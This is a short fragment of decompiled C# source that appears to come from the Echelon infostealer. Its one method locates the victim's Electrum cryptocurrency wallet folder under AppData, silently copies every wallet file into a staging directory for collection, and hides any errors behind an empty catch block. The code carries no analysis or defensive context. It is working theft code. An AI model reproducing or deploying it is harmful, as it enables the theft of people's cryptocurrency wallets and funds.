using Echelon;
using System.IO;

internal class au
{
	public static string a = "\\Wallets\\Electrum\\";

	public static void a(string jp)
	{
		try
		{
			FileInfo[] files = new DirectoryInfo(Global.AppDate + "\\Electrum\\wallets").GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				Directory.CreateDirectory(jp + au.a);
				fileInfo.CopyTo(jp + au.a + fileInfo.Name);
			}
			ba.a++;
		}
		catch
		{
		}
	}
}
